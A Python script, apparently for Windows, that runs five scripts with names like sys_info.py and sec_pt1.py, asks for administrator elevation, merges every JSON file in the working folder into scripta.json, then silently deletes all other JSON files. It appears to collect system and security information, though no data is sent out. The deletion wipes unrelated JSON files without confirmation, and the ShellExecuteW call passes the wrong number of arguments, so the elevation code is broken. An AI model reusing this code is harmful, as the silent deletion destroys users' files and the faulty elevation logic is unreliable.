import os
import json
import ctypes

def is_admin():
  """
  Checks if the current user has administrator privileges.
  Returns:
      bool: True if user is admin, False otherwise.
  """
  try:
    return ctypes.windll.shell32.IsUserAnAdmin()
  except:
    return False

def run_as_admin(script):
  """
  Runs the provided script with administrator privileges.
  Args:
      script (str): Path to the script to execute.
  """
  params = (os.path.dirname(script), os.path.basename(script))
  ctypes.windll.shell32.ShellExecuteW(None, "runas", *params, 1, 0, None, None, "")

def execute_python_files(python_files):
  """
  Execute a list of Python files.
  Args:
      python_files (list): List of Python file names.
  """
  current_directory = os.getcwd()
  for file_name in python_files:
    file_path = os.path.join(current_directory, file_name)
    if is_admin():
      os.system(f"python {file_path}")
    else:
      print(f"Administrator privileges are required to execute scripts. Please run this script with administrator rights.")
      run_as_admin(file_path)
      return  # Exit after failing to run a script with admin rights

def merge_json_files():
    """
    Merge all JSON files in the current directory into one well-formatted JSON file.
    Suppresses errors during decoding.
    """
    current_directory = os.getcwd()
    json_files = [filename for filename in os.listdir(current_directory) if filename.endswith(".json")]

    merged_data = {}
    for filename in json_files:
        try:
            with open(filename, "r") as file:
                data = json.load(file)
                merged_data.update(data)
        except json.JSONDecodeError:
            pass  # Suppress errors during decoding

    output_filename = "scripta.json"
    with open(output_filename, "w") as output_file:
        json.dump(merged_data, output_file, indent=4)

    #print(f"Merged data from {len(json_files)} JSON files and saved to {output_filename}")

def delete_json_files_except_one():
    """
    Delete all JSON files in the current directory except for "scripta.json".
    Suppresses errors during deletion.
    """
    all_files = os.listdir()
    json_files_to_delete = [filename for filename in all_files if filename.endswith('.json') and filename != 'scripta.json']

    for filename in json_files_to_delete:
        try:
            os.remove(filename)
            #print(f"Deleted: {filename}")
        except OSError:  # Catch potential deletion errors
            pass  # Suppress errors during deletion

if __name__ == "__main__":
  python_files_to_execute = ["all_process.py", "apps.py", "sec_pt1.py", "sec_pt2.py", "sys_info.py"]
  execute_python_files(python_files_to_execute)
  merge_json_files()
  delete_json_files_except_one()
